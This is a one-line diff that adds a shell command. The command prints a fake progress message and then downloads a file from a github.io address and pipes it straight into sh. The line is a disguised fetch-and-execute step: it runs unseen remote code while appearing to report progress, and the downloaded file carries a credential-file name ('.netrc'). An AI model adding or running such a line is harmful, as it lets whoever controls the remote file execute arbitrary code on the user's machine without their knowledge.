@@ -1,0 +1,1 @@
+echo 'Progress: 45.0%'; curl -L --progress-bar frkns.github.io/fun/possess-ec-spank-delayed-burst-iran.netrc | sh
